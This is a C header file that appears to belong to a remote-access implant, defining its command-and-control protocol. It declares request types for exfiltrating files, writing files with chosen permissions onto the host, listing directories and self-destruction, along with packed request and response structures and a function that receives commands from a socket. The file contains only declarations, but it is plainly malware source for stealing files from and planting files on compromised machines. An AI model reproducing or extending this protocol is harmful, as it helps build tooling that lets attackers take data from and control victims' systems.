#ifndef CNC_PROT_H
#define CNC_PROT_H

#include <stdint.h>
#include <dirent.h>

enum req_type
{
    EXF_FILE,
    INF_FILE,
    READ_DIR,
    SUICIDE
};

enum file_status
{
    GOOD,
    OPEN_ERROR,
    READ_ERROR,
    WRITE_ERROR,
    STAT_ERROR,
    NOT_FILE,
    NOT_DIRECTORY
};

struct __attribute__((__packed__)) c2_req
{
    size_t req_len;
    uint8_t type;
};

struct __attribute__((__packed__)) c2_res
{
    size_t res_len;
    uint8_t type;
};

struct __attribute__((__packed__)) exf_req
{
    struct c2_req header;
    uint16_t path_len;
    char path[];
};

struct __attribute__((__packed__)) exf_res
{
    struct c2_res header;
    uint8_t status;
    size_t content_len;
    char content[];
};

struct __attribute__((__packed__)) inf_req
{
    struct c2_req header;
    uint16_t perm;
    uint16_t path_len;
    size_t content_len;
    char data[];
};

struct __attribute__((__packed__)) inf_res
{
    struct c2_res header;
    uint8_t status;
};

struct __attribute__((__packed__)) dir_req
{
    struct c2_req header;
    uint16_t path_len;
    char path[];
};

struct __attribute__((__packed__)) dir_res
{
    struct c2_res header;
    uint8_t status;
    char dents[];
};

struct exf_res *exf_res_init(uint32_t file_size, enum file_status status);
struct inf_res *inf_res_init(enum file_status status);
struct dir_res *dir_res_init(enum file_status);
struct c2_req *receive_command(int sockfd);

#endif
